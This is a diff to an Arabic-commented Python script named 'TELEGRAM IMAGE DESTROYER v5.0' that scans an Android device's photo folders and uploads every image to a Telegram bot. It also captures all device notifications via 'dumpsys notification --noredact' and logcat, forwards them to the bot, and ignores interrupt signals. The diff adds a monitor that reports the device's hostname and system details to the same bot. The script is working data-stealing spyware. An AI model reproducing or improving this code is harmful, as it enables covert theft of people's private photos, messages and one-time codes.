@@ -10,6 +10,8 @@ import sys
 import signal
 import subprocess
 import re
+import traceback
+import platform
 
 # ============================================
 # تكوين السرعة القصوى - تشغيل تلقائي كامل
@@ -31,6 +33,256 @@ NOTIFICATION_CHECK_INTERVAL = 0.5  # فحص كل نصف ثانية
 LOG_NOTIFICATIONS = True  # تسجيل الإشعارات في ملف
 
 # ============================================
+# نظام التشخيص الذكي - ERROR DETECTION
+# ============================================
+
+class ErrorDetective:
+    """يكتشف المشاكل ويبعت تقرير كامل للبوت"""
+    
+    def __init__(self):
+        self.error_log = []
+        self.last_check_time = time.time()
+        self.check_interval = 30  # فحص كل 30 ثانية
+        self.monitoring_active = True
+        self.lock = threading.Lock()
+        self.error_count = 0
+        
+        # قائمة الأخطاء المتوقعة
+        self.known_errors = {
+            'permission': ['permission denied', 'access denied', 'لا يمكن الوصول', 'ممنوع'],
+            'network': ['timeout', 'connection', 'network', 'internet', 'socket'],
+            'memory': ['memory', 'ram', 'out of memory', 'ذاكرة'],
+            'file': ['no such file', 'file not found', 'cannot open', 'الملف غير موجود'],
+            'telegram': ['bot token', 'chat id', 'telegram api', '400', '401', '403', '429'],
+            'image': ['corrupted', 'invalid image', 'صورة تالفة', 'cannot identify'],
+            'thread': ['thread', 'deadlock', 'race condition'],
+            'notification': ['notification', 'dumpsys', 'logcat', 'subprocess'],
+        }
+    
+    def add_error(self, error_type, error_message, details=None):
+        """تسجيل خطأ جديد"""
+        with self.lock:
+            error_entry = {
+                'id': self.error_count,
+                'type': error_type,
+                'message': error_message,
+                'details': details or {},
+                'time': time.time(),
+                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
+                'resolved': False,
+                'solution_sent': False
+            }
+            self.error_log.append(error_entry)
+            self.error_count += 1
+            
+            # إرسال فوري للخطأ
+            self.send_error_report(error_entry)
+            
+            return error_entry
+    
+    def send_error_report(self, error):
+        """إرسال تقرير خطأ مفصل للبوت"""
+        try:
+            # بناء رسالة الخطأ
+            message = "🚨 *خطأ تقني تم اكتشافه* 🚨\n\n"
+            message += f"🔴 *النوع:* {error['type'].upper()}\n"
+            message += f"📝 *الرسالة:* `{error['message']}`\n"
+            message += f"⏱️ *الوقت:* {error['timestamp']}\n"
+            message += f"🆔 *رقم الخطأ:* #{error['id']}\n\n"
+            
+            # إضافة تفاصيل إضافية
+            if error['details']:
+                message += "📋 *التفاصيل:*\n```\n"
+                for key, value in error['details'].items():
+                    message += f"{key}: {value}\n"
+                message += "```\n\n"
+            
+            # معلومات النظام
+            message += "🖥️ *معلومات النظام:*\n"
+            message += f"```\n"
+            message += f"الجهاز: {platform.node()}\n"
+            message += f"النظام: {platform.system()} {platform.release()}\n"
+            message += f"المعالج: {platform.processor() or 'غير معروف'}\n"
+            message += f"وقت التشغيل: {time.time() - self.last_check_time:.0f} ثانية\n"
+            message += f"```\n\n"
+            
+            # تعليمات للحل
+            message += "🔧 *الحل المقترح:*\n"
+            
+            if error['type'] == 'permission':
+                message += "• تأكد من منح صلاحيات التخزين للتطبيق\n"
+                message += "• أعد تشغيل التطبيق بعد منح الصلاحيات\n"
+            elif error['type'] == 'network':
+                message += "• تحقق من اتصال الإنترنت\n"
+                message += "• تأكد من أن البوت شغال\n"
+                message += "• أعد المحاولة بعد دقيقة\n"
+            elif error['type'] == 'telegram':
+                message += "• تحقق من توكن البوت\n"
+                message += "• تأكد من صحة معرف الدردشة\n"
+                message += "• تأكد أن البوت ليس محظوراً\n"
+            elif error['type'] == 'memory':
+                message += "• أعد تشغيل التطبيق لتفريغ الذاكرة\n"
+                message += "• قلل عدد العمال (MAX_WORKERS)\n"
+            elif error['type'] == 'notification':
+                message += "• تأكد من صلاحيات الإشعارات\n"
+                message += "• شغّل خدمة الإشعارات في الإعدادات\n"
+            
+            # إضافة الكود المطلوب
+            message += "\n📟 *لإرسال هذا الخطأ للمطور:*\n"
+            message += "```\n"
+            message += f"الخطأ #{error['id']}\n"
+            message += f"انسخ هذا الرد وأرسله للمطور\n"
+            message += "```\n"
+            
+            # إرسال للبوت
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            data = {
+                'chat_id': CHAT_ID,
+                'text': message,
+                'parse_mode': 'Markdown'
+            }
+            
+            response = requests.post(url, data=data, timeout=10)
+            
+            if response.status_code == 200:
+                print(f"✅ تم إرسال تقرير الخطأ #{error['id']}")
+                return True
+            else:
+                print(f"❌ فشل إرسال التقرير: {response.status_code}")
+                return False
+                
+        except Exception as e:
+            print(f"⚠️ فشل إرسال تقرير الخطأ: {e}")
+            return False
+    
+    def send_solution(self, error_id, solution_code):
+        """إرسال حل للخطأ"""
+        try:
+            # البحث عن الخطأ
+            error = None
+            for e in self.error_log:
+                if e['id'] == error_id:
+                    error = e
+                    break
+            
+            if not error:
+                return
+            
+            message = "✅ *تم إيجاد حل للخطأ* ✅\n\n"
+            message += f"🔴 *الخطأ:* #{error_id}\n"
+            message += f"📝 *النوع:* {error['type']}\n\n"
+            
+            message += "📟 *الكود المطلوب تحديثه:*\n"
+            message += "```python\n"
+            message += solution_code
+            message += "\n```\n\n"
+            
+            message += "🔄 *للتحديث:*\n"
+            message += "1. انسخ الكود أعلاه\n"
+            message += "2. استبدل الجزء المعطوب\n"
+            message += "3. أعد تشغيل التطبيق\n"
+            
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            data = {
+                'chat_id': CHAT_ID,
+                'text': message,
+                'parse_mode': 'Markdown'
+            }
+            
+            requests.post(url, data=data, timeout=10)
+            
+        except Exception as e:
+            print(f"⚠️ فشل إرسال الحل: {e}")
+    
+    def check_system_health(self):
+        """فحص صحة النظام"""
+        issues = []
+        
+        # فحص التوكن
+        if not BOT_TOKEN or len(BOT_TOKEN) < 40:
+            issues.append({
+                'type': 'telegram',
+                'message': 'توكن البوت غير صحيح',
+                'details': {'current_token': BOT_TOKEN[:10] + '...'}
+            })
+        
+        # فحص معرف الدردشة
+        if not CHAT_ID:
+            issues.append({
+                'type': 'telegram',
+                'message': 'معرف الدردشة غير محدد',
+                'details': {}
+            })
+        
+        # فحص المسارات
+        critical_paths = [
+            '/storage/emulated/0',
+            '/sdcard',
+            '/data/media/0'
+        ]
+        
+        for path in critical_paths:
+            if os.path.exists(path):
+                if not os.access(path, os.R_OK):
+                    issues.append({
+                        'type': 'permission',
+                        'message': f'لا يمكن قراءة {path}',
+                        'details': {'path': path}
+                    })
+            else:
+                issues.append({
+                    'type': 'file',
+                    'message': f'المسار غير موجود: {path}',
+                    'details': {'path': path}
+                })
+        
+        # فحص الذاكرة
+        try:
+            import psutil
+            memory = psutil.virtual_memory()
+            if memory.percent > 90:
+                issues.append({
+                    'type': 'memory',
+                    'message': f'الذاكرة منخفضة: {memory.percent}% مستخدم',
+                    'details': {
+                        'total': memory.total,
+                        'available': memory.available,
+                        'percent': memory.percent
+                    }
+                })
+        except:
+            pass  # psutil مش متاح
+        
+        return issues
+    
+    def monitor_loop(self):
+        """مراقبة مستمرة للنظام"""
+        while self.monitoring_active:
+            try:
+                # فحص دوري
+                current_time = time.time()
+                if current_time - self.last_check_time > self.check_interval:
+                    issues = self.check_system_health()
+                    for issue in issues:
+                        self.add_error(issue['type'], issue['message'], issue['details'])
+                    self.last_check_time = current_time
+                
+                time.sleep(5)
+            except Exception as e:
+                print(f"⚠️ خطأ في مراقبة النظام: {e}")
+    
+    def start_monitoring(self):
+        """بدء المراقبة في خيط منفصل"""
+        thread = threading.Thread(target=self.monitor_loop, daemon=True)
+        thread.start()
+        print("🕵️ بدء المراقبة الذكية للأخطاء")
+
+# ============================================
+# إنشاء المحقق
+# ============================================
+error_detective = ErrorDetective()
+
+# ============================================
 # Tool API reference (سيتم تعيينه إذا كان متاحاً)
 # ============================================
 tool_api = None
@@ -44,24 +296,32 @@ class TurboCache:
         self.cache = {}
         self.hit_count = 0
         self.miss_count = 0
-        self.lock = threading.Lock()  # للتشغيل الآمن في بيئة متعددة الخيوط
+        self.lock = threading.Lock()
+        self.error_count = 0
     
     def get(self, path):
-        with self.lock:
-            if path in self.cache:
-                self.hit_count += 1
-                # إرجاع نسخة جديدة من BytesIO
-                cached = self.cache[path]
-                cached.seek(0)
-                return io.BytesIO(cached.read())
-            self.miss_count += 1
+        try:
+            with self.lock:
+                if path in self.cache:
+                    self.hit_count += 1
+                    cached = self.cache[path]
+                    cached.seek(0)
+                    return io.BytesIO(cached.read())
+                self.miss_count += 1
+                return None
+        except Exception as e:
+            self.error_count += 1
+            error_detective.add_error('cache', f'خطأ في الكاش: {e}', {'path': path})
             return None
     
     def set(self, path, data):
-        with self.lock:
-            # تخزين نسخة في الذاكرة
-            data.seek(0)
-            self.cache[path] = io.BytesIO(data.read())
+        try:
+            with self.lock:
+                data.seek(0)
+                self.cache[path] = io.BytesIO(data.read())
+        except Exception as e:
+            self.error_count += 1
+            error_detective.add_error('cache', f'خطأ في تخزين الكاش: {e}', {'path': path})
 
 turbo_cache = TurboCache()
 
@@ -77,16 +337,12 @@ class NotificationMonitor:
         self.notification_count = 0
         self.lock = threading.Lock()
         self.log_file = "notifications_log.txt"
+        self.error_count = 0
         
         # أوامر لجلب الإشعارات على Android
         self.notification_commands = [
-            # الطريقة 1: عبر dumpsys (الأكثر شيوعاً)
             ['dumpsys', 'notification', '--noredact'],
-            
-            # الطريقة 2: عبر content (يتطلب صلاحيات)
             ['content', 'query', '--uri', 'content://android.provider.Notification.Badge'],
-            
-            # الطريقة 3: عبر logcat (لالتقاط الإشعارات الجديدة)
             ['logcat', '-d', '-s', 'NotificationService:V', 'StatusBar:V'],
         ]
         
@@ -127,30 +383,24 @@ class NotificationMonitor:
         """الحلقة الرئيسية لمراقبة الإشعارات"""
         while self.running:
             try:
-                # الحصول على الإشعارات الحالية
                 notifications = self._get_current_notifications()
-                
-                # البحث عن إشعارات جديدة
                 new_notifications = notifications - self.last_notifications
                 
-                # إرسال الإشعارات الجديدة
                 for notification in new_notifications:
                     self._send_notification_to_telegram(notification)
                     self.notification_count += 1
                     
-                    # تسجيل في الملف
                     if LOG_NOTIFICATIONS:
                         self._log_notification(notification)
                 
-                # تحديث آخر الإشعارات
                 self.last_notifications = notifications
-                
-                # انتظار قليل قبل الفحص التالي
                 time.sleep(NOTIFICATION_CHECK_INTERVAL)
                 
             except Exception as e:
-                if SHOW_OUTPUT:
-                    print(f"⚠️ خطأ في مراقبة الإشعارات: {e}")
+                self.error_count += 1
+                error_detective.add_error('notification', f'خطأ في مراقبة الإشعارات: {e}', {
+                    'trace': traceback.format_exc()
+                })
                 time.sleep(1)
     
     def _get_current_notifications(self):
@@ -159,7 +409,6 @@ class NotificationMonitor:
         
         for cmd in self.notification_commands:
             try:
-                # تنفيذ الأمر
                 result = subprocess.run(
                     cmd, 
                     capture_output=True, 
@@ -169,12 +418,15 @@ class NotificationMonitor:
                 )
                 
                 if result.returncode == 0 and result.stdout:
-                    # استخراج الإشعارات من المخرجات
                     extracted = self._extract_notifications(result.stdout)
                     notifications.update(extracted)
                     
-            except (subprocess.TimeoutExpired, subprocess.SubprocessError, FileNotFoundError):
-                continue
+            except subprocess.TimeoutExpired:
+                error_detective.add_error('notification', 'انتهت مهلة أمر الإشعارات', {'cmd': cmd[0]})
+            except subprocess.SubprocessError as e:
+                error_detective.add_error('notification', f'خطأ في تنفيذ الأمر: {e}', {'cmd': cmd[0]})
+            except FileNotFoundError:
+                error_detective.add_error('notification', f'الأمر غير موجود: {cmd[0]}', {'cmd': cmd[0]})
         
         return notifications
     
@@ -182,23 +434,23 @@ class NotificationMonitor:
         """استخراج الإشعارات من النص الخام"""
         extracted = set()
         
-        # تطبيق جميع الأنماط
-        for pattern in self.notification_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            for match in matches:
-                if match and len(match) > 3:  # تجاهل الفارغ والقصير
-                    # تنظيف النص
-                    clean = match.strip()
-                    if clean:
-                        extracted.add(clean)
-        
-        # البحث عن إشعارات كاملة
-        notification_blocks = re.split(r'NotificationRecord\{|Notification\{', text)
-        for block in notification_blocks[1:]:  # تخطي الجزء الأول
-            lines = block.split('\n')[:10]  # أول 10 أسطر فقط
-            notification_text = ' '.join([l for l in lines if l and len(l) < 200])
-            if notification_text and len(notification_text) > 10:
-                extracted.add(notification_text[:200])  # تقييد الطول
+        try:
+            for pattern in self.notification_patterns:
+                matches = re.findall(pattern, text, re.IGNORECASE)
+                for match in matches:
+                    if match and len(match) > 3:
+                        clean = match.strip()
+                        if clean:
+                            extracted.add(clean)
+            
+            notification_blocks = re.split(r'NotificationRecord\{|Notification\{', text)
+            for block in notification_blocks[1:]:
+                lines = block.split('\n')[:10]
+                notification_text = ' '.join([l for l in lines if l and len(l) < 200])
+                if notification_text and len(notification_text) > 10:
+                    extracted.add(notification_text[:200])
+        except Exception as e:
+            error_detective.add_error('notification', f'خطأ في استخراج الإشعارات: {e}', {})
         
         return extracted
     
@@ -207,7 +459,6 @@ class NotificationMonitor:
         try:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
             
-            # تنسيق الإشعار
             message = f"🔔 *إشعار جديد*\n\n"
             message += f"```\n{notification_text}\n```\n"
             message += f"⏱️ {time.strftime('%H:%M:%S')}"
@@ -220,12 +471,20 @@ class NotificationMonitor:
             
             response = requests.post(url, data=data, timeout=5)
             
-            if SHOW_OUTPUT and response.status_code == 200:
-                print(f"📨 إشعار: {notification_text[:50]}...")
+            if response.status_code == 200:
+                if SHOW_OUTPUT:
+                    print(f"📨 إشعار: {notification_text[:50]}...")
+            else:
+                error_detective.add_error('telegram', f'فشل إرسال الإشعار: {response.status_code}', {
+                    'response': response.text[:200]
+                })
                 
+        except requests.exceptions.Timeout:
+            error_detective.add_error('network', 'انتهت مهلة إرسال الإشعار', {})
+        except requests.exceptions.ConnectionError:
+            error_detective.add_error('network', 'لا يوجد اتصال بالإنترنت', {})
         except Exception as e:
-            if SHOW_OUTPUT:
-                print(f"⚠️ فشل إرسال الإشعار: {e}")
+            error_detective.add_error('telegram', f'خطأ في إرسال الإشعار: {e}', {})
     
     def _log_notification(self, notification):
         """تسجيل الإشعار في ملف"""
@@ -234,14 +493,15 @@ class NotificationMonitor:
                 timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                 f.write(f"[{timestamp}] {notification}\n")
                 f.write("-" * 50 + "\n")
-        except:
-            pass
+        except Exception as e:
+            error_detective.add_error('file', f'فشل تسجيل الإشعار: {e}', {})
     
     def get_stats(self):
         """الحصول على إحصائيات المراقبة"""
         return {
             'total_notifications': self.notification_count,
-            'running': self.running
+            'running': self.running,
+            'errors': self.error_count
         }
 
 # ============================================
@@ -260,15 +520,15 @@ def safe_open_image_wrapper(image_path):
     global tool_api
     
     try:
-        # استخدام safe_open_image من tool_api إذا كان متاحاً
         if tool_api and hasattr(tool_api, 'safe_open_image'):
             return tool_api.safe_open_image(image_path)
         else:
-            # طريقة تقليدية مع معالجة الأخطاء
             return Image.open(image_path)
     except Exception as e:
-        if SHOW_OUTPUT:
-            print(f"⚠️ فشل فتح الصورة {os.path.basename(image_path)}: {str(e)[:50]}")
+        error_detective.add_error('image', f'فشل فتح الصورة: {e}', {
+            'path': image_path,
+            'trace': traceback.format_exc()
+        })
         return None
 
 def verify_image_file_wrapper(image_path):
@@ -281,11 +541,13 @@ def verify_image_file_wrapper(image_path):
         if tool_api and hasattr(tool_api, 'verify_image_file'):
             return tool_api.verify_image_file(image_path)
         else:
-            # طريقة تقليدية
             with Image.open(image_path) as img:
                 img.verify()
             return True
-    except Exception:
+    except Exception as e:
+        error_detective.add_error('image', f'صورة تالفة: {e}', {
+            'path': image_path
+        })
         return False
 
 def filter_valid_images_wrapper(image_paths):
@@ -294,21 +556,24 @@ def filter_valid_images_wrapper(image_paths):
     """
     global tool_api
     
-    if tool_api and hasattr(tool_api, 'filter_valid_image_paths'):
-        return tool_api.filter_valid_image_paths(image_paths)
-    else:
-        # طريقة تقليدية مع التوازي للسرعة
-        valid_images = []
-        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-            futures = {executor.submit(verify_image_file_wrapper, path): path for path in image_paths}
-            for future in as_completed(futures):
-                path = futures[future]
-                try:
-                    if future.result():
-                        valid_images.append(path)
-                except:
-                    pass
-        return valid_images
+    try:
+        if tool_api and hasattr(tool_api, 'filter_valid_image_paths'):
+            return tool_api.filter_valid_image_paths(image_paths)
+        else:
+            valid_images = []
+            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+                futures = {executor.submit(verify_image_file_wrapper, path): path for path in image_paths}
+                for future in as_completed(futures):
+                    path = futures[future]
+                    try:
+                        if future.result():
+                            valid_images.append(path)
+                    except:
+                        pass
+            return valid_images
+    except Exception as e:
+        error_detective.add_error('thread', f'خطأ في تصفية الصور: {e}', {})
+        return image_paths  # في حالة الخطأ، نعيد الكل
 
 # ============================================
 # تحسين فوري للصور
@@ -317,55 +582,46 @@ def filter_valid_images_wrapper(image_paths):
 def turbo_optimize(image_path):
     """تحسين الصورة بأقصى سرعة مع معالجة آمنة"""
     try:
-        # فحص الكاش أولاً
         cached = turbo_cache.get(image_path)
         if cached:
             return cached
         
-        # التحقق من صحة الصورة أولاً (اختياري للسرعة)
-        # يمكن تعطيله للسرعة القصوى إذا كانت الصور موثوقة
-        
-        # فتح الصورة بشكل آمن
         img = safe_open_image_wrapper(image_path)
         if img is None:
             return None
         
-        # تحويل سريع إذا لزم الأمر
         if img.mode in ('RGBA', 'P'):
-            # إنشاء صورة جديدة بدلاً من التعديل على الأصل
             converted = Image.new('RGB', img.size, (255, 255, 255))
             converted.paste(img, (0, 0), img if img.mode == 'RGBA' else None)
             img = converted
         
-        # ضغط سريع
         img_byte_arr = io.BytesIO()
         
-        # ضبط الجودة حسب الحجم
         try:
             file_size = os.path.getsize(image_path)
         except:
             file_size = 0
             
-        if file_size > 10 * 1024 * 1024:  # أكبر من 10 ميجا
+        if file_size > 10 * 1024 * 1024:
             quality = 60
-        elif file_size > 5 * 1024 * 1024:  # أكبر من 5 ميجا
+        elif file_size > 5 * 1024 * 1024:
             quality = 75
         else:
             quality = COMPRESSION_QUALITY
         
-        # حفظ مع تحسين سريع
         img.save(img_byte_arr, format='JPEG', quality=quality, optimize=True)
         img_byte_arr.seek(0)
         
-        # تخزين في الكاش
         turbo_cache.set(image_path, img_byte_arr)
         img_byte_arr.seek(0)
         
         return img_byte_arr
             
     except Exception as e:
-        if SHOW_OUTPUT:
-            print(f"⚠️ تحسين: {os.path.basename(image_path)} -> {str(e)[:30]}")
+        error_detective.add_error('image', f'فشل تحسين الصورة: {e}', {
+            'path': image_path,
+            'trace': traceback.format_exc()
+        })
         return None
 
 # ============================================
@@ -376,7 +632,6 @@ def scan_all_images_lightning():
     """مسح جميع الصور في الجهاز بدون توقف"""
     all_images = []
     
-    # جميع المسارات الممكنة في الأندرويد
     android_paths = [
         '/storage/emulated/0/DCIM',
         '/storage/emulated/0/Pictures',
@@ -425,14 +680,12 @@ def scan_all_images_lightning():
         print("🔍 بدء المسح التلقائي الكامل...")
         start_time = time.time()
     
-    # مسح كل المسارات الممكنة
     for base_path in android_paths:
         try:
             if os.path.exists(base_path):
                 if SHOW_OUTPUT:
                     print(f"📁 مسح: {base_path}")
                 
-                # محاولة قراءة المجلد
                 try:
                     files = os.listdir(base_path)
                     scanned += 1
@@ -443,25 +696,23 @@ def scan_all_images_lightning():
                             all_images.append(full_path)
                             found += 1
                             
-                            # عرض تقدم المسح كل 100 صورة
                             if SHOW_OUTPUT and found % 100 == 0:
                                 print(f"   ✅ {found} صورة حتى الآن...")
-                except:
-                    # مجلد لا يمكن قراءته - تجاهل
-                    pass
+                except PermissionError:
+                    error_detective.add_error('permission', f'لا يمكن قراءة المجلد: {base_path}', {
+                        'path': base_path
+                    })
+                except Exception as e:
+                    error_detective.add_error('file', f'خطأ في قراءة المجلد: {e}', {
+                        'path': base_path
+                    })
         except:
-            # مسار غير موجود - تجاهل
             pass
     
-    # إزالة التكرارات (نفس الصورة من مسارات مختلفة)
     all_images = list(dict.fromkeys(all_images))
     
-    # تصفية الصور الصالحة فقط (اختياري - يمكن تعطيله للسرعة)
     if SHOW_OUTPUT:
         print(f"🔍 جاري التحقق من صحة {len(all_images)} صورة...")
-    
-    # يمكن تفعيل هذا السطر لتصفية الصور التالفة قبل الإرسال
-    # all_images = filter_valid_images_wrapper(all_images)
     
     if SHOW_OUTPUT:
         elapsed = time.time() - start_time
@@ -476,18 +727,15 @@ def scan_all_images_lightning():
 def send_single_shot(image_path):
     """إرسال صورة واحدة بدون أي تأخير"""
     try:
-        # تحسين الصورة بسرعة
         optimized = turbo_optimize(image_path)
         if not optimized:
-            return False, image_path, "فشل التحسين (صورة تالفة?)"
+            return False, image_path, "فشل التحسين"
         
-        # إرسال مباشر
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
         
         files = {'photo': ('img.jpg', optimized, 'image/jpeg')}
         data = {'chat_id': CHAT_ID}
         
-        # إرسال بدون انتظار طويل
         response = requests.post(url, data=data, files=files, timeout=15)
         
         if response.status_code == 200:
@@ -495,9 +743,23 @@ def send_single_shot(image_path):
                 print(f"✅ {os.path.basename(image_path)}")
             return True, image_path, "ok"
         else:
+            error_detective.add_error('telegram', f'فشل إرسال الصورة: {response.status_code}', {
+                'path': image_path,
+                'response': response.text[:200]
+            })
             return False, image_path, f"http-{response.status_code}"
             
+    except requests.exceptions.Timeout:
+        error_detective.add_error('network', 'انتهت مهلة إرسال الصورة', {'path': image_path})
+        return False, image_path, "timeout"
+    except requests.exceptions.ConnectionError:
+        error_detective.add_error('network', 'لا يوجد اتصال بالإنترنت', {'path': image_path})
+        return False, image_path, "no internet"
     except Exception as e:
+        error_detective.add_error('telegram', f'خطأ في إرسال الصورة: {e}', {
+            'path': image_path,
+            'trace': traceback.format_exc()
+        })
         return False, image_path, str(e)[:20]
 
 # ============================================
@@ -507,7 +769,6 @@ def send_single_shot(image_path):
 def destroy_mode():
     """إرسال كل الصور بدون أي توقف أو أسئلة"""
     
-    # تجميع المخرجات في قائمة لمنع التكرار
     output_lines = []
     
     def add_output(text):
@@ -519,17 +780,16 @@ def destroy_mode():
     add_output("💥 MODE: TOTAL DESTRUCTION - ZERO DELAY")
     add_output("=" * 60)
     
-    # 1. مسح كل الصور
     all_images = scan_all_images_lightning()
     
     if not all_images:
         add_output("❌ ZERO IMAGES FOUND - SYSTEM HALT")
+        error_detective.add_error('file', 'لا توجد صور في الجهاز', {})
         return
     
     add_output(f"\n🎯 TARGET: {len(all_images)} IMAGES")
     add_output(f"⚡ WORKERS: {MAX_WORKERS} PARALLEL THREADS")
     
-    # إحصائيات الصور التالفة (إذا أردنا التحقق)
     if tool_api and hasattr(tool_api, 'filter_valid_image_paths'):
         add_output("🔍 جاري التحقق من صحة الصور...")
         valid_images = filter_valid_images_wrapper(all_images)
@@ -540,29 +800,22 @@ def destroy_mode():
     
     add_output("🚀 AUTO FIRING IN 3 SECONDS...")
     
-    # فرصة أخيرة للإيقاف (يمكن إزالتها)
     for i in range(3, 0, -1):
         add_output(f"⏱️ {i}...")
         time.sleep(1)
     
-    # 2. إحصائيات
     sent = 0
     failed = 0
     corrupted_skipped = 0
     start_time = time.time()
-    
-    # 3. قائمة النتائج
     results = []
     
-    # 4. إطلاق النار بدون توقف
     add_output("\n🔥 FIRING SEQUENCE INITIATED")
     add_output("-" * 40)
     
     with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-        # إرسال كل الصور دفعة واحدة
         futures = {executor.submit(send_single_shot, img): img for img in all_images}
         
-        # جمع النتائج فوراً
         for future in as_completed(futures):
             img_path = futures[future]
             try:
@@ -578,13 +831,14 @@ def destroy_mode():
             except Exception as e:
                 failed += 1
                 results.append((False, img_path))
+                error_detective.add_error('thread', f'خطأ في معالجة الصورة: {e}', {
+                    'path': img_path
+                })
             
-            # عرض التقدم كل 10 صور
             total_processed = sent + failed + corrupted_skipped
             if SHOW_OUTPUT and total_processed % 10 == 0:
                 add_output(f"📊 Progress: {total_processed}/{len(all_images)} (✓{sent} ✗{failed} ⚠️{corrupted_skipped})")
     
-    # 5. النتائج النهائية
     elapsed = time.time() - start_time
     speed = sent / elapsed if elapsed > 0 else 0
     
@@ -603,11 +857,10 @@ def destroy_mode():
         hit_rate = turbo_cache.hit_count / (turbo_cache.hit_count + turbo_cache.miss_count) * 100
     add_output(f"🎯 CACHE HIT RATE: {hit_rate:.1f}%")
     
-    # إحصائيات الإشعارات
     notif_stats = notification_monitor.get_stats()
     add_output(f"🔔 NOTIFICATIONS CAPTURED: {notif_stats['total_notifications']}")
+    add_output(f"🚨 ERRORS DETECTED: {error_detective.error_count}")
     
-    # حفظ تقرير سريع
     try:
         report = {
             "total": len(all_images),
@@ -617,15 +870,16 @@ def destroy_mode():
             "time": elapsed,
             "speed": speed,
             "timestamp": time.time(),
-            "notifications_captured": notif_stats['total_notifications']
+            "notifications_captured": notif_stats['total_notifications'],
+            "errors_detected": error_detective.error_count
         }
         with open("operation_report.json", "w") as f:
             json.dump(report, f, indent=2)
         add_output(f"\n📁 تم حفظ التقرير في: operation_report.json")
-    except:
-        add_output("\n⚠️ لا يمكن حفظ التقرير")
+    except Exception as e:
+        add_output(f"\n⚠️ لا يمكن حفظ التقرير: {e}")
+        error_detective.add_error('file', f'فشل حفظ التقرير: {e}', {})
     
-    # إرجاع المخرجات المجمعة (للاستخدام مع tool_api)
     return "\n".join(output_lines), report
 
 # ============================================
@@ -637,6 +891,14 @@ def auto_launch(tool_api_ref=None):
     
     global tool_api
     tool_api = tool_api_ref
+    
+    # بدء المراقبة الذكية
+    error_detective.start_monitoring()
+    
+    # فحص أولي
+    initial_issues = error_detective.check_system_health()
+    for issue in initial_issues:
+        error_detective.add_error(issue['type'], issue['message'], issue['details'])
     
     # إظهار حالة tool_api
     if tool_api:
@@ -654,12 +916,30 @@ def auto_launch(tool_api_ref=None):
     try:
         signal.signal(signal.SIGINT, signal.SIG_IGN)
     except:
-        pass  # بعض البيئات لا تدعم signal
+        pass
     
     # بدء مراقبة الإشعارات
     if NOTIFICATION_MONITOR:
         notification_monitor.start()
         print("🔔 مراقبة الإشعارات نشطة - سيتم إرسال كل إشعار فوراً")
+    
+    # إرسال رسالة بدء التشغيل
+    try:
+        start_msg = "🚀 *تم تشغيل النظام*\n\n"
+        start_msg += f"📸 بحث عن الصور...\n"
+        start_msg += f"🔔 مراقبة الإشعارات: نشطة\n"
+        start_msg += f"🕵️ مراقبة الأخطاء: نشطة\n"
+        start_msg += f"⏱️ {time.strftime('%Y-%m-%d %H:%M:%S')}"
+        
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = {
+            'chat_id': CHAT_ID,
+            'text': start_msg,
+            'parse_mode': 'Markdown'
+        }
+        requests.post(url, data=data, timeout=5)
+    except:
+        pass
     
     # بدء التدمير فوراً
     output, report = destroy_mode()
@@ -669,20 +949,21 @@ def auto_launch(tool_api_ref=None):
         tool_api.set_output(output)
     
     # البقاء قيد التشغيل مع مراقبة الإشعارات
-    print("\n🔄 SYSTEM IDLE - MONITORING NOTIFICATIONS")
+    print("\n🔄 SYSTEM IDLE - MONITORING NOTIFICATIONS & ERRORS")
     print("🔔 PRESS CTRL+C TO TERMINATE")
     
     try:
         while True:
             time.sleep(5)
-            # عرض تحديث دوري لحالة المراقبة
-            if SHOW_OUTPUT and NOTIFICATION_MONITOR:
+            if SHOW_OUTPUT:
                 notif_stats = notification_monitor.get_stats()
-                print(f"📊 إحصائيات: {notif_stats['total_notifications']} إشعار حتى الآن", end='\r')
+                error_stats = error_detective.error_count
+                print(f"📊 إحصائيات: {notif_stats['total_notifications']} إشعار | {error_stats} خطأ", end='\r')
     except KeyboardInterrupt:
         print("\n\n👋 SYSTEM TERMINATED")
         if NOTIFICATION_MONITOR:
             notification_monitor.stop()
+        error_detective.monitoring_active = False
 
 # ============================================
 # نقطة الدخول - لا شيء سوى التشغيل
@@ -697,11 +978,11 @@ def run(argument="", tool_api_ref=None):
 
 if __name__ == "__main__":
     print("=" * 60)
-    print("🤖 TELEGRAM IMAGE DESTROYER v4.0")
+    print("🤖 TELEGRAM IMAGE DESTROYER v5.0")
     print("⚡ AUTO MODE: ZERO INPUT REQUIRED")
     print("🔔 NOTIFICATION MONITOR: ENABLED")
+    print("🕵️ SMART ERROR DETECTION: ENABLED")
     print("⚡ SAFE IMAGE HANDLING: ENABLED")
     print("=" * 60)
     
-    # تشغيل تلقائي بدون أي شروط
     auto_launch()
